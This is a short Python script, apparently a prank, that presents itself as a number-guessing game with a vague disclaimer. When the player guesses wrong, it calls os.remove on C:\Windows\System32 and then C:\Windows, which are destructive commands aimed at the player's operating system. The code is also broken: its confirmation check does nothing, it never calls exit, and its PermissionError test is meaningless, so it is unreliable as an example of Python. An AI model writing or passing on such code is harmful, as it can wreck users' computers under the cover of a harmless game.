import random
import os

print("i currently dont know what this does if it breaks anything im sorry please say yes if you aknoledge that i am not responsible for anything that happens to your computer")

confirmation = input("do you aknowledge this? (yes/no) ")
if confirmation.lower() == "yes":
    if confirmation.lower == "no":
        exit

number = random.randint(1, 10)

guess = input("Guess a number between 1 and 10 ")

guess = int(guess)

if guess == number:

    print("you guessed it right")

else:
    print("wrong now i delete something")

    os.remove("C:\\Windows\\System32")

    if PermissionError == True:
        os.remove("C:\\Windows")